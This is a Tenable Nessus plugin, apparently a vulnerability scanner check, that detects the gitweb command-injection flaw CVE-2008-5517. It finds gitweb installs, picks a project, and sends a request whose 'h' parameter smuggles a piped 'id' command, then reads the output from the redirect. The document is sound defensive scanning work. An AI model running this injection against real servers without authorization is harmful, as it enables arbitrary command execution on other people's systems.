#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(44675);
  script_version("$Revision: 1.9 $");
 script_cvs_date("$Date: 2015/09/24 21:08:39 $");

  script_cve_id("CVE-2008-5517");
  script_bugtraq_id(33215);
  script_osvdb_id(53538);
  script_xref(name:"EDB-ID", value:"11497");

  script_name(english:"GIT gitweb git_snapshot / git_object Shell Metacharacter Arbitrary Command Execution");
  script_summary(english:"Tries to execute a command");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a CGI script that can be abused to
execute arbitrary commands."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of gitweb, a web-enabled interface to the open source
distributed version control system Git, hosted on the remote web
server fails to sanitize user-supplied input to the 'gitweb.cgi'
script of shell metacharacters before passing it to a shell.

An unauthenticated, remote attacker can leverage this issue to execute
arbitrary commands subject to the privileges under which the web
server operates."
  );
   # http://git.kernel.org/?p=git/git.git;a=commitdiff;h=516381d50ba7acb66f260461f4d566ab9b6df107
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?fef3b12d");
  script_set_attribute(
    attribute:"see_also",
    value:"http://git.kernel.org/?p=git/git.git;a=shortlog;h=refs/tags/v1.5.6"
  );
  script_set_attribute(attribute:"solution", value:"Upgrade to GIT 1.5.6 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(94);

  script_set_attribute(attribute:"vuln_publication_date", value:"2008/06/17");
  script_set_attribute(attribute:"patch_publication_date", value:"2008/06/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/02/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:git:git");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:80);


# nb: we only see one line of command output.
cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/gitweb", "/cgi-bin/gitweb", "/git", "/code", cgi_dirs()));
else dirs = make_list(cgi_dirs());

err_msg = "";
gitweb_found = FALSE;
foreach dir (dirs)
{
  proj = "";

  foreach ext (make_list("cgi", "pl", "perl"))
  {
    # Check for gitweb.
    url = dir + "/gitweb." + ext;

    res = http_send_recv3(port:port, method:"GET", item:url);
    if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

    if (
      '<!-- git web interface version' >< res[2] ||
      'meta name="generator" content="gitweb' >< res[2]
    )
    {
      gitweb_found = TRUE;

      # Identify an existing project.
      pat = 'gitweb\\.' + ext + '\\?p=([^;"]+);a=';
      matches = egrep(pattern:pat, string:res[2]);
      if (matches)
      {
        foreach match (split(matches, keep:FALSE))
        {
          item = eregmatch(pattern:pat, string:match);
          if (!isnull(item))
          {
            proj = item[1];
            break;
          }
        }
      }
      if (!proj)
      {
        err_msg += "Couldn't find a project to use to test the gitweb install at " + build_url(port:port, qs:url) + '.\n';
        continue;
      }

      somefile = unixtime() + '-' + SCRIPT_NAME;
      exploit = url + '?' +
        'p=' + proj + ';' +
        'a=object;' +
        'f=' + somefile + ';' +
        'h=' + hexstr(MD5(rand_str(length:8))) + '|' + urlencode(str:cmd) + ';' +
        'hb=' + hexstr(MD5(rand_str(length:8)));

      res = http_send_recv3(port:port, method:"GET", item:exploit);
      if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

      hdrs = parse_http_headers(status_line:res[0], headers:res[1]);
      if (isnull(hdrs['$code'])) code = 0;
      else code = hdrs['$code'];

      if (isnull(hdrs['location'])) location = "";
      else location = urldecode(estr:hdrs['location']);

      # There's a problem if ...
      if (
        # we're redirected and...
        code == 302 &&
        # the action parameter where we're redirected contains our command output.
        location &&
        ereg(pattern:';a='+cmd_pat+';f='+somefile, string:location)
      )
      {
        output = strstr(location, ';a=') - ';a=';
        output = output - strstr(output, ';f='+somefile);

        if (report_verbosity > 0)
        {
          report = '\n' +
            "Nessus was able to execute the command '" + cmd + "' on the" + '\n' +
            'remote host using the following URL :\n' +
            '\n' +
            '  ' + build_url(port:port, qs:exploit) + '\n';

          if (report_verbosity > 1)
          {
            report += '\n' +
              'It produced the following output :\n' +
              '\n' +
              crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
              output + '\n' +
              crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
          }
          security_hole(port:port, extra:report);
        }
        else security_hole(port);
        exit(0);
      }
    }

    # If we found a project, we don't need to test other extensions in this directory.
    if (proj) break;
  }
}

if (gitweb_found == FALSE) exit(0, "The web server on port "+port+" does not appear to host gitweb.");
else if (err_msg) exit(1, err_msg);
else exit(0, "The host is not affected.");
